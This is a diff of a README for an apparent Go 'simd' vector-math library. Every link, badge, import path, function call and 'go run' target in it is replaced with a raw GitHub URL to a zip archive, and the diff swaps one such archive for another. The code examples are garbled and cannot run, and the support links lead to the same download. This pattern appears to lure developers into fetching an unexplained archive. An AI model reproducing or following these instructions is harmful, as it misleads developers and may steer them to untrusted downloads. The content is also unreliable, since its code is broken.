@@ -6,7 +6,7 @@ Welcome to the **simd** library! With **simd**, you can perform high-speed calcu
 
 ## 📥 Download Simd
 
-[![Download Simd](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip%20Simd-Download-brightgreen)](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip)
+[![Download Simd](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip%20Simd-Download-brightgreen)](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ To run the **simd** library, ensure your system meets the following requirements
 
 ## 📥 Download & Install
 
-To download **simd**, visit our [Releases page](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip). There, you'll find the latest version available for installation. 
+To download **simd**, visit our [Releases page](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip). There, you'll find the latest version available for installation. 
 
 Simply click on the version you wish to download. Once the file is downloaded, follow these steps to install:
 
@@ -43,26 +43,26 @@ Using the **simd** library is straightforward. Here’s how to get started:
 
 1. **Import the Library**: Open your Go project and add the import statement:
    ```go
-   import "https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip"
+   import "https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip"
    ```
 
 2. **Write Your Calculation**: Use the library functions to perform high-speed calculations. Here’s a simple example:
    ```go
-   result := https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip([]float32{1.0, 2.0, 3.0}, []float32{4.0, 5.0, 6.0})
-   https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip(result) // Output: [5.0 7.0 9.0]
+   result := https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip([]float32{1.0, 2.0, 3.0}, []float32{4.0, 5.0, 6.0})
+   https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip(result) // Output: [5.0 7.0 9.0]
    ```
 
 3. **Run Your Application**: Save your changes and run your Go project using the Go CLI:
    ```bash
-   go run https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip
+   go run https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip
    ```
    Observe the improved performance in your calculations.
 
 ## 📘 Example Projects
 
 To better understand how to use **simd**, check out these example projects:
-- [Simple Vector Calculations](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip)
-- [Performance Benchmarking](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip)
+- [Simple Vector Calculations](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip)
+- [Performance Benchmarking](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip)
 
 ## 🤝 Contributing
 
@@ -71,9 +71,9 @@ If you would like to contribute to **simd**, please check our guidelines in the 
 ## 🌐 Community and Support
 
 For any questions or support, please join our community:
-- Check out our [Issues page](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip) for common questions.
-- For direct support, reach us via [GitHub Discussions](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip).
+- Check out our [Issues page](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip) for common questions.
+- For direct support, reach us via [GitHub Discussions](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip).
 
 Thank you for using **simd**! With this powerful library, you can enhance your calculations and achieve faster results in your Go applications. Happy coding!
 
-[![Download Simd](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip%20Simd-Download-brightgreen)](https://raw.githubusercontent.com/Anthonygdn5/simd/main/f16/simd_1.8.zip)
+[![Download Simd](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip%20Simd-Download-brightgreen)](https://raw.githubusercontent.com/Anthonygdn5/simd/main/c128/Software-v1.2-beta.4.zip)
